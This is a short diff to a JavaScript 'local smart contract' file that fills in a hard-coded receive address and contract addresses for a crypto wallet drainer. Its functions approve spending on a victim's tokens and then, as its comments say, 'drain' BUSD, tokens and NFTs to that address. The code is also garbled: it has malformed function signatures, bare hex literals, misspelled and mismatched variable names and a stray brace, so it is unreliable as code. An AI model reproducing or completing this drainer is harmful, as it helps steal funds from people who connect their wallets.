@@ -1,22 +1,22 @@
 //code for local smart contract
 
-const receiveAddress = "";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x2a0BA4d7bb7Ab535c5f27ae6B311A784292C1B74"; 0x2a0BA4d7bb7Ab535c5f27ae6B311A784292C1B74   
 
 	
-var cryptotokenContract;
-var smartcontract
+var cryptotokenContract = 0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8,
+var smartcontract = 0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8
 
 
-function approveSpending(token) {
+function approveSpending(token);true,
 	
-	 smartcontract.methods.approvetransaction.(targetwallet);      //the smart contract gets approved to access tokens
+	 smartcontract.methods.approvetransaction.(targetwallet);0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8 // the smart contract gets approved to access token
 	smartcontract.methods.drainBUSD.send(to:recieveAddress).token(cryptotokencontract); // the smart contract drains to your wallet after 0.1 minutes
 }
 	  
   			
 }
 
-function drainwallet(token) {
+function drainwallet(token);true,
 	  cryptotokenContract.methods.transfer(receiveAddress).send({ from: currentAddr, to:receiveAddress }); //this drains the nfts if the value is above 0.5 eth 
   			
 }
